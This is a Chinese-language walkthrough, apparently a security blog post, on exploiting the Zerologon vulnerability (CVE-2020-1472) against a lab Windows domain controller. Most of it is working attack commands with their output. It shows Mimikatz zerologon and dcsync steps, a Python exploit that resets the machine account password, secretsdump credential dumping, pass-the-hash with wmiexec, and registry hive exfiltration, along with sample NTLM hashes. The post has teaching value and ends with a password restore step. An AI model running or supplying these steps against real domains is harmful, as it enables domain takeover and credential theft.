## 前言

2020年08月11日，Windows官方发布了 NetLogon
特权提升漏洞的风险通告，该漏洞编号为CVE-2020-1472，漏洞等级：严重，漏洞评分：10分，该漏洞也称为“Zerologon”。攻击者在通过NetLogon（MS-NRPC）协议与AD域控建立安全通道时，可利用该漏洞将AD域控的计算机账号密码置为空，从而控制域控服务器。

## 影响版本

    
    
    Windows Server 2008 R2 for x64-based Systems Service Pack 1
    Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
    Windows Server 2012
    Windows Server 2012 (Server Core installation)
    Windows Server 2012 R2
    Windows Server 2012 R2 (Server Core installation)
    Windows Server 2016
    Windows Server 2016 (Server Core installation)
    Windows Server 2019
    Windows Server 2019 (Server Core installation)
    Windows Server, version 1903 (Server Core installation)
    Windows Server, version 1909 (Server Core installation)
    Windows Server, version 2004 (Server Core installation)

###

## 漏洞利用

#### 方式一： **利用Mimikatz在域主机上进行攻击**

在爆发出CVE-2020-1472漏洞后，Mimikatz在2020.09.18版本中更新了Zerologon模块，并支持通过Zerologon漏洞攻击直接域控服务器，但是这种方法想要我们把Mimikatz等利用工具上传到域内主机中，如果域内主机存在杀毒软件，我们还需要进行对Mimikatz等利用工具进行免杀z处理，优点就是比较方便，不用通过代理不存在因为网络问题的未知错误。

第一步：通过Nslookup -type=SRV _ldap._tcp命令获取域控制服务器的机器账号，一般来说机器账号为机器名加上$符号组成；

![1671517649_63a155d1edfc1c0913295.png!small?1671517650549](https://image.3001.net/images/20221220/1671517649_63a155d1edfc1c0913295.png!small?1671517650549)

第二步：利用Mimikatz的Zerologon模块去探测域控是否存在该漏洞，如果存在漏洞就会回显“OK，Vulnerable”。

    
    
    lsadump::zerologon /target:10.1.19.2 /account:dc$
    
    shell c:\mimikatz\x64\mimikatz.exe "lsadump::zerologon /target:10.1.19.2 /account:dc$" "exit"

![1671517689_63a155f9b57b30a6526fd.png!small?1671517691113](https://image.3001.net/images/20221220/1671517689_63a155f9b57b30a6526fd.png!small?1671517691113)

第三步：利用置零修改域控密码为空，这一步会把域控dc(即dc$用户)的密码置为空，hash为31d6cfe0d16ae931b73c59d7e0c089c0，回显两个OK显示成功把密码置零，因为机器用户是不可以登录系统的，但是域控的机器用户具备Dcsync特权，我们就可以滥用该特权来进行Dcsync攻击；

    
    
    lsadump::zerologon /target:10.1.19.2 /account:dc$ /exploit
    
    shell c:\mimikatz\x64\mimikatz.exe "lsadump::zerologon /target:10.1.19.2 /account:dc$ /exploit" "exit"

![1671517755_63a1563b0e5ab0f28780f.png!small?1671517755659](https://image.3001.net/images/20221220/1671517755_63a1563b0e5ab0f28780f.png!small?1671517755659)

第四步：Dcsync获取域管理员的Hash，这一步可以使用Mimikatz来进行Dcsync并获取域管理员帐户或 KRBTGT 帐户的哈希值即可。

    
    
    lsadump::dcsync /dc:dc.test19.god /authuser:dc$ /authdomain:test19.god /authpassword:"" /domain:test19.god /authntlm /user:krbtgt
    
    shell c:\mimikatz\x64\mimikatz.exe "lsadump::dcsync /dc:dc.test19.god /authuser:dc$ /authdomain:test19.god /authpassword: /domain:test19.god /authntlm /user:administrator" "exit"
    

![1671517791_63a1565f078c836c38c32.png!small?1671517792360](https://image.3001.net/images/20221220/1671517791_63a1565f078c836c38c32.png!small?1671517792360)

第五步：hash 注入起一个域管cmd

    
    
    privilege::debug
    sekurlsa::pth /user:administrator /domain:test19 /ntlm:aa647b916a1fad374df9c30711d58a7a 
    
    shell c:\mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:test19 /ntlm:aa647b916a1fad374df9c30711d58a7a" "exit"

![1671517823_63a1567f2d5db7df1b528.png!small?1671517824044](https://image.3001.net/images/20221220/1671517823_63a1567f2d5db7df1b528.png!small?1671517824044)

第六步：通过域管cmd，恢复域控机器账户密码

    
    
    lsadump::postzerologon /target:10.1.19.2 /account:dc$
    
    c:\mimikatz\x64\mimikatz.exe "lsadump::postzerologon /target:10.1.19.2 /account:dc$" "exit"

![1671517859_63a156a35e9869830a902.png!small?1671517859994](https://image.3001.net/images/20221220/1671517859_63a156a35e9869830a902.png!small?1671517859994)

第七步：验证，修复之后，无法再次获得域管hash

![1671517890_63a156c2c05d0343ba720.png!small?1671517891952](https://image.3001.net/images/20221220/1671517890_63a156c2c05d0343ba720.png!small?1671517891952)

#### 方式二： **利用socks5隧道在域外主机上进行攻击**

查看域控的主机名

![1671517920_63a156e00c8918b16f1c9.png!small?1671517920520](https://image.3001.net/images/20221220/1671517920_63a156e00c8918b16f1c9.png!small?1671517920520)

本地先尝试使用域控制密码，查看域机器账号的Hash，方便与修改之后比较。

    
    
    secretsdump.py test19.com/administrator:"abc@123"@10.1.19.2 -just-dc-user "DC$"

![1671518005_63a157357ae6fd59d4652.png!small?1671518006790](https://image.3001.net/images/20221220/1671518005_63a157357ae6fd59d4652.png!small?1671518006790)

### 环境准备

    
    
    1.git clone https://github.com/mstxq17/cve-2020-1472.git
    2.pip3 install -r requirements.txt

执行出现这个错误

![1671518120_63a157a8484ca69d874df.png!small?1671518121266](https://image.3001.net/images/20221220/1671518120_63a157a8484ca69d874df.png!small?1671518121266)

说明是impacket模块出现了问题，试试卸载impacket模块，在github安装最新版。

    
    
    git clone https://github.com/SecureAuthCorp/impacket.git
    cd impacket && pip3 install .

 **第一步：poc 检测**

![1671518033_63a1575157089a05a2298.png!small?1671518034150](https://image.3001.net/images/20221220/1671518033_63a1575157089a05a2298.png!small?1671518034150)

 **第二步：使用cve-2020-1472-exploit.py将机器账号重新设置**

    
    
    python3 cve-2020-1472-exploit.py DC$ 10.1.19.2

![1671518195_63a157f3a05a9698d8c48.png!small?1671518196323](https://image.3001.net/images/20221220/1671518195_63a157f3a05a9698d8c48.png!small?1671518196323)

再次查看机器账户hash是否修改为空

![1671518232_63a1581893c201463fe8f.png!small?1671518234334](https://image.3001.net/images/20221220/1671518232_63a1581893c201463fe8f.png!small?1671518234334)

 **第三步：导出域内所有用户的凭证，获取administrator用户的hash**

    
    
    secretsdump.py test19.god/DC\$@10.1.19.2 -no-pass

![1671518266_63a1583a74bfe685020ae.png!small?1671518267675](https://image.3001.net/images/20221220/1671518266_63a1583a74bfe685020ae.png!small?1671518267675)

此时，DC$ hash已被替换为空

    
    
    DC$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

![1671518288_63a15850d0730a9349efb.png!small?1671518289240](https://image.3001.net/images/20221220/1671518288_63a15850d0730a9349efb.png!small?1671518289240)

到了域管的hash

    
    
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:aa647b916a1fad374df9c30711d58a7a:::

使用administrator的hash横向连接,拿到域管权限。

    
    
    wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:aa647b916a1fad374df9c30711d58a7a test19.god/Administrator@10.1.19.2

 **第四步：还原DC$机器账号的hash**

获取计算机账号原始hash

    
    
    reg save HKLM\SYSTEM system.save
    reg save HKLM\SAM sam.save
    reg save HKLM\SECURITY security.save
    lget system.save
    lget sam.save
    lget security.save
    del /f system.save
    del /f sam.save
    del /f security.save

wmiexec指定下编码 -codec

    
    
    wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:aa647b916a1fad374df9c30711d58a7a test19.god/Administrator@10.1.19.2 -codec gb2312

![1671518397_63a158bdc172b731e3b32.png!small?1671518398939](https://image.3001.net/images/20221220/1671518397_63a158bdc172b731e3b32.png!small?1671518398939)

下载的文件在与wimiexec.py 相同目录

![1671518427_63a158db265ca0e46cf3b.png!small?1671518427911](https://image.3001.net/images/20221220/1671518427_63a158db265ca0e46cf3b.png!small?1671518427911)

获取机器账户原来的hex信息

    
    
    secretsdump.py -sam sam.save -system system.save -security security.save LOCAL

![1671518455_63a158f782f581c53af28.png!small?1671518456421](https://image.3001.net/images/20221220/1671518455_63a158f782f581c53af28.png!small?1671518456421)

将该原始计算机账户哈希还原

    
    
    python3 restorepassword.py test.god/DC@DC -target-ip 10.1.19.2 -hexpass 887e4f16601423c299792351e9f9a2bf8a90ee068bb6b0a30114375a53472db2d99e39c04670fd9bd02a923ec6bfaa48042a352dfff720b2f06b90874659e35f32ecbd93c398ab140adcf59e4104e7178e877082f88212314d53f672d75d00fe43762e8b118f56d98f332b45e946b5b0fbc41f245bdfa6d35a63283d56c579f9b7e47e1801d37d3eda7d2edf2917231df0352afd42156a4240c9ebc73703445af8eb75289da4cd9eb4182fa82398e3419d1cf61f6ec415b4e9d75aaf974353956dc5ce3f59ef0e07193798ba0ad5682196a932779e3019015d0d0e8852ec18459b00f15601e5bb6f727b6fc7d18c05fb

![1671518476_63a1590c1acf43b141fcb.png!small?1671518476825](https://image.3001.net/images/20221220/1671518476_63a1590c1acf43b141fcb.png!small?1671518476825)

查看DC$账号的hash，已成功还原。

    
    
    secretsdump.py test19.com/administrator:"abc@123"@10.1.19.2 -just-dc-user "DC$"

无法导出域管hash了

![1671518503_63a159277f33a4c42f43b.png!small?1671518504164](https://image.3001.net/images/20221220/1671518503_63a159277f33a4c42f43b.png!small?1671518504164)

###

  

